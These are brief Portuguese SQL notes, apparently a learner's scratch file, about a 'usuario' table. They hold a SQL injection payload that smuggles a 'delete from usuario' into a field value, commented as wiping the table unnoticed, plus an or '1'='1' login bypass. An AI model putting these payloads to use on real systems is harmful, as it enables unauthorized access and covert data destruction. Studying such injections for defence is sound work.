NO BANCO

#update

insert into usuario values (null, 'luis', 'luis@gmail.com','usu');

desc usuario;

--inject zerar a tabela sem a pessoa perceber, confunde com update e detona todo usuario
update usuario set email='' or '1'='1';delete from usuario;#';
============
--'

--logando
select * from usuario where nome='luis' or '1'='1' or email ='';

#consulta